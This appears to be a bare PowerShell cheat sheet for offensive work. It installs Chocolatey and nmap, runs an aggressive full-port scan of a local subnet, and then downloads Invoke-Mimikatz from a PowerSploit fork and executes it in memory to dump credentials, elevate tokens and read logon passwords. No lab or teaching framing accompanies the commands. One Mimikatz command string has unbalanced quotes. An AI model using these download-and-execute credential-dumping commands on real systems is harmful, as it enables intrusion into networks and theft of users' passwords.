
#Install choco
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))

#Uppdate choco
choco upgrade chocolatey -y

#enable choco allowGlobalConfirmation
choco feature enable -n allowGlobalConfirmation

#add source to choco
choco source add -n=jshwa -s="https://jshwa.azurewebsites.net/api/v2"
choco source enable -n chocolatey

#install nmap via choco
choco install nmap -v -y

#restart ise
#############################################################################################

#Nmap
# Scan the network for open ports and services 
$scan = nmap -p 1-65535 -T4 -A -v 192.168.1.0/24

# Display the results of the Nmap scan
$scan.Hosts | Select-Object Address, Ports

#############################################################################################
#Mimikatz
#powershell -exec bypass
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/AddaxSoft/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1");Invoke-Mimikatz -DumpCreds
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/AddaxSoft/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1");Invoke-Mimikatz -Command '"privilege:debug" token::elevate" "sekurlsa::credman" "exit"'
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/AddaxSoft/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1");Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'

Get-Credential
